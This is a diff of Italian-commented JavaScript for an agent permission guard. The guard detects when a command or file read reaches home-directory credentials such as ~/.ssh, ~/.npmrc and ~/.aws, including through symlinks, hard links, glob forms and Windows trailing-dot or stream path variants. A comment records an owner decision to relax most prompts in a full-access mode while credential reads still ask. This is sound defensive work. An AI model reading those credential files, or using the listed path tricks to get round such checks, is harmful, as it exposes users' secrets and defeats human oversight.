+    const scritto = cartellaVera === sopra ? assoluto : join(cartellaVera, nomeBase(assoluto));
+    let foglia;
+    try { foglia = fs.lstatSync(scritto); } catch { return scritto; }
+    return foglia.isSymbolicLink() ? veroDi(scritto) : scritto;
+  };
+  const casaCamminata = veroDi(casa);
+  const casaVera = typeof casaCamminata === 'string' ? casaCamminata : casa;
   const credenziale = (p) => !nelProgetto(p) && (credenzialeSottoLaCasa(p, casa) || (casaVera !== casa && credenzialeSottoLaCasa(p, casaVera)));
   const stessoFileDiUnaCredenziale = (vero) => {
     try {
@@ -1552,7 +2043,7 @@ export function credenzialeDellaCasaLetta({ tipo, percorso, comando, cartella, h
       return null;
     }
   };
-  /** Dove il pezzo tocca una credenziale della casa (la descrizione per la carta), o `null`. */
+  /** Dove il pezzo tocca una credenziale della casa (la descrizione per la carta), `OLTRE_IL_TETTO` se il cammino non arriva in fondo, o `null`. */
   const dentro = (pezzo) => {
     const scritto = String(pezzo ?? '').trim();
     const pulito = comeDiscoLocale(scritto.replace(/^["'`]+|["'`]+$/gu, ''), home);
@@ -1563,18 +2054,38 @@ export function credenzialeDellaCasaLetta({ tipo, percorso, comando, cartella, h
       : typeof cartella === 'string' && cartella !== '' ? risolvi(cartella, espanso) : null;
     if (assoluto === null) return null;
     if (credenziale(assoluto)) return scritto;
-    const vero = veroDi(assoluto);
-    if (vero === null) return null;
+    const vero = veroDelPezzo(assoluto);
+    if (vero === null || vero === OLTRE_IL_TETTO) return vero;
     if (vero !== assoluto && credenziale(vero)) return `${scritto} → ${vero}`;
     const trovato = stessoFileDiUnaCredenziale(vero);
     return trovato ? `${scritto} = ${trovato}` : null;
   };
-  const pezzi = LETTURE.has(tipo) ? [percorso] : tipo === 'shell' ? pezziDelComando(comando) : [];
+  /*
+   * ⛔ Decisione 155 dell'owner (04/11/2026, aggiornamento 17:02 del brief): questa funzione la chiama SOLO l'Accesso pieno, e lì la guardia
+   *   dei biglietti (il comando, «troppo complesso», le parole con `.chiave`) non fa più carte: come Claude Code in `bypassPermissions`. Resta
+   *   la 161: LEGGERE una credenziale di casa (`~/.ssh`, `~/.npmrc`, `~/.aws`… e `~/.talos-biglietti`, che sta nell'elenco) chiede ancora,
+   *   ed è il cammino qui sotto. Fuori dall'Accesso pieno la guardia resta dov'era (`motivoDaChiedere`, S2/S5/S6 come sono).
+   *   La cartella `~/.talos-biglietti` scritta come la shell la riscrive (glob, classi, nome corto 8.3) è la stessa credenziale: chiede,
+   *   con la frase dei biglietti (`nominaLaCartellaDeiBiglietti`). Il nome del comando, `<porta>.chiave` da sola e «troppo complesso» no.
+   *   S10 resta vero: con la risposta di `motivoDaChiedere` passata (anche `null`) la cartella si cerca solo se la guardia ha già detto
+   *   «nomina»; un comando senza nessuna parola dei biglietti non rilegge niente.
+   */
+  const guardiaDetta = segreto === undefined ? 'nomina' : (segreto?.[ESITO_DEI_BIGLIETTI] ?? false);
+  if (tipo === 'shell' && guardiaDetta === 'nomina' && nominaLaCartellaDeiBiglietti(comando)) {
+    const segnalazione = segnalazioneDeiBiglietti('nomina');
+    return { ...segnalazione, ...frasePerLaPersona(segnalazione, tipo), credenzialeDellaCasa: true };
+  }
+  /* blocco dopo (punto 5): lo stesso pezzo una volta sola, nell'ordine in cui compare (stessa risposta, un cammino del disco per pezzo diverso) */
+  const pezzi = LETTURE.has(tipo) ? [percorso] : tipo === 'shell' ? [...new Set(pezziDelComando(comando))] : [];
   /* il bersaglio vero di un collegamento, se il controllo dei segreti l'ha già trovato */
   const bersaglio = typeof segreto?.percorso === 'string' ? segreto.percorso.split(/ (?:→|=) /u).pop() : null;
   for (const pezzo of [...pezzi, ...(bersaglio ? [bersaglio] : [])]) {
     const toccata = dentro(pezzo);
     if (toccata === null) continue;
+    if (toccata === OLTRE_IL_TETTO) {
+      const oltre = oltreIlTetto(String(pezzo).trim());
+      return { ...oltre, ...frasePerLaPersona(oltre, tipo), credenzialeDellaCasa: true };
+    }
     const segnalazione = { classe: 'segreto', percorso: segreto?.percorso?.match(/ (?:→|=) /u) ? segreto.percorso : toccata };
     return { ...segnalazione, ...frasePerLaPersona(segnalazione, tipo), credenzialeDellaCasa: true };
   }
@@ -1590,28 +2101,40 @@ export function motivoDaChiedere({ tipo, comando, percorso, cartella, home = hom
   const perPercorso = lettura || scrittura;
   const testo = perPercorso ? percorso : comando;
   if (typeof testo !== 'string' || testo.trim() === '') return null;
+  const deiBiglietti = tipo === 'shell' ? nominaIlComandoDeiBiglietti(testo) : false;
+  if (deiBiglietti) {
+    const segnalazione = segnalazioneDeiBiglietti(deiBiglietti);
+    return { ...segnalazione, ...frasePerLaPersona(segnalazione, tipo) };
+  }
   /* `elenca`, `puntiNascosti` e `fsSync` (lstat/readlink) sono per le prove: in produzione valgono il disco vero e la regola del sistema operativo. */
   const nominato = nominaUnSegreto(testo, { home, cartella, espandi: !perPercorso, ...(elenca ? { elenca } : {}), ...(puntiNascosti === undefined ? {} : { puntiNascosti }), ...(orologio ? { orologio } : {}), ...(leggiTesta ? { leggiTesta } : {}) });
-  if (nominato) return conChiaveDelConsenso({ ...nominato, ...frasePerLaPersona(nominato, tipo) }, scrittura);
+  if (nominato) return { ...nominato, ...frasePerLaPersona(nominato, tipo) };
   /* LINK-SEGRETO: il nome è innocuo, il file vero dietro un collegamento no (vedi `bersaglioSegretoDiUnCollegamento`). */
   const collegato = perPercorso ? bersaglioSegretoDiUnCollegamento(testo, { cartella, home, ...(fsSync ? { fsSync } : {}) }) : null;
-  if (collegato) return conChiaveDelConsenso({ ...collegato, ...frasePerLaPersona(collegato, tipo) }, scrittura);
+  if (collegato) return { ...collegato, ...frasePerLaPersona(collegato, tipo) };
   /* HARD LINK (owner 16/10 notte): per la lettura e la scrittura di un file, e per ogni pezzo di un comando che sia un file */
+  /*
+   * ⛔ Blocco dopo (punto 5, 04/11/2026): un comando di 200 mila caratteri costava ~4 secondi qui, perché ogni pezzo camminava il disco da capo, anche lo stesso pezzo
+   *   ripetuto mille volte. Ora i pezzi si guardano una volta sola (lo stesso pezzo dà la stessa risposta, e il primo che chiede resta il primo: l'insieme tiene
+   *   l'ordine) e la memoria delle cartelle già camminate vale per tutto il comando, come vale già per una ricerca (R6). Stessa domanda, stesse risposte.
+   */
+  const pezziUnici = perPercorso ? [testo] : [...new Set(pezziDelComando(testo))];
+  const memoriaDelComando = {};
   if (tipo !== 'elenca') {
-    for (const pezzo of perPercorso ? [testo] : pezziDelComando(testo)) {
-      const fisico = segretoDiUnCollegamentoFisico(pezzo, { cartella, home, ...(fsSync?.statSync ? { statFn: fsSync.statSync } : {}), ...(fsSync?.lstatSync ? { fsSync } : {}) });
-      if (fisico) return conChiaveDelConsenso({ ...fisico, ...frasePerLaPersona(fisico, tipo) }, scrittura);
+    for (const pezzo of pezziUnici) {
+      const fisico = segretoDiUnCollegamentoFisico(pezzo, { cartella, home, memoria: memoriaDelComando, ...(fsSync?.statSync ? { statFn: fsSync.statSync } : {}), ...(fsSync?.lstatSync ? { fsSync } : {}) });
+      if (fisico) return { ...fisico, ...frasePerLaPersona(fisico, tipo) };
     }
   }
   if (scrittura) return null;
   /* 14/10/2026: un file d'esempio nominato da una lettura o da un comando, con una chiave vera dentro (un elenco non apre i file). */
   if (tipo !== 'elenca') {
-    for (const pezzo of lettura ? [testo] : pezziDelComando(testo)) {
+    for (const pezzo of pezziUnici) {
       const esempio = esempioConUnaChiave(pezzo, { cartella, home, ...(leggiTesta ? { leggiTesta } : {}) });
       if (esempio) return { ...esempio, ...frasePerLaPersona(esempio, tipo) };
     }
   }
-  for (const pezzo of pezziDelComando(testo)) {
+  for (const pezzo of lettura ? [...new Set(pezziDelComando(testo))] : pezziUnici) {
     const fuori = esceDalWorkspaceVersoUnNascosto(pezzo, { cartella, home });
     if (fuori) return { ...fuori, ...frasePerLaPersona(fuori, tipo) };
   }
@@ -1746,6 +2269,33 @@ function dentroOUguale(percorso, radice) {
   return p.startsWith(r.endsWith(sep) ? r : r + sep);
 }
 
+/* Un livello sopra una chiave di `perConfronto`, o `null` in cima */
+function sopraDi(chiave) {
+  const sep = chiave.includes('\\') ? '\\' : '/';
+  const i = chiave.lastIndexOf(sep);
+  if (i === -1 || chiave === sep) return null;
+  const su = i === 0 ? sep : chiave.slice(0, i);
+  const radice = /^[a-z]:$/u.test(su) ? su + sep : su;
+  return radice === chiave ? null : radice;
+}
+
+/**
+ * Molti percorsi contro molti nomi, senza disco: lo stesso confronto di `dentroOUguale`, una voce di `Set` alla volta. N2 del Mobile (01/11/2026): il confronto nome per nome andava su disco a ogni
+ * coppia, e 1000 rinomine per 100 file fermavano Node 80 s. `contiene`: il percorso è uno dei nomi, o una cartella che ne contiene uno. `sotto`: è uno dei nomi, o sta dentro uno di loro.
+ */
+export function indiceDeiNomi(nomi) {
+  const esatti = new Set();
+  const conAntenati = new Set();
+  for (const nome of nomi) {
+    esatti.add(perConfronto(nome));
+    for (let su = perConfronto(nome); su !== null && !conAntenati.has(su); su = sopraDi(su)) conAntenati.add(su);
+  }
+  return {
+    contiene: (percorso) => conAntenati.has(perConfronto(percorso)),
+    sotto: (percorso) => { for (let su = perConfronto(percorso); su !== null; su = sopraDi(su)) if (esatti.has(su)) return true; return false; },
+  };
+}
+
 /**
  * La cartella bloccata che contiene `percorso` (relativo alla cartella della sessione, o assoluto): `{ radice }`, oppure
  * `{ radice, irrisolvibile: true }` se il percorso vero non si sa dire, oppure `null`. Senza blocchi, `null` senza toccare il disco.
@@ -1754,7 +2304,25 @@ export function bloccataDa(percorso, { cartella, bloccati, realpathFn = realpath
   if (!Array.isArray(bloccati)) return null;
   const radici = bloccati.filter((b) => typeof b === 'string' && b !== '');
   if (radici.length === 0) return null;
-  const grezzo = percorsoLinuxNormalizzato(typeof percorso === 'string' && percorso.trim() !== '' ? percorso.trim() : '.');
+  const intero = typeof percorso === 'string' && percorso.trim() !== '' ? percorso : '.';
+  /* 31/10/2026 (Mobile, provato sul nucleo): `leggi` apre il percorso così com'è, e con gli spazi tolti un blocco su « sopra/segreta»
+     guardava un'altra cartella. Node non toglie niente (ENOENT su «segreta./k.txt», misurato), ma un comando sì: cmd e PowerShell passano
+     dalle regole di Win32, che tolgono punti e spazi da ogni pezzo. Si guardano tutte le forme, e ogni forma fa nome e percorso vero. */
+  for (const forma of new Set([intero.trim(), intero, ...(process.platform === 'win32' ? [senzaCodeDiWindows(intero.trim())] : [])])) {
+    const esito = bloccataInUnaForma(forma, { cartella, radici, realpathFn });
+    if (esito) return esito;
+  }
+  return null;
+}
+
+const senzaCodeDiWindows = (forma) => forma.split(/([\\/])/u).map((pezzo, i) => {
+  if (pezzo === '.' || pezzo === '..') return pezzo;
+  const disco = i === 0 ? (/^[A-Za-z]:/u.exec(pezzo)?.[0] ?? '') : ''; // come `segmentiDi`: `C:` non è uno stream
+  return disco + pezzo.slice(disco.length).replace(/:.*$/su, '').replace(/[. ]+$/u, '');
+}).join('');
+
+function bloccataInUnaForma(forma, { cartella, radici, realpathFn }) {
+  const grezzo = percorsoLinuxNormalizzato(forma);
   const linux = /^\/mnt\/[A-Za-z](\/|$)/u.test(grezzo);
   let assoluto;
   if (linux || isAbsolute(grezzo)) assoluto = linux ? grezzo : risolvi(grezzo);
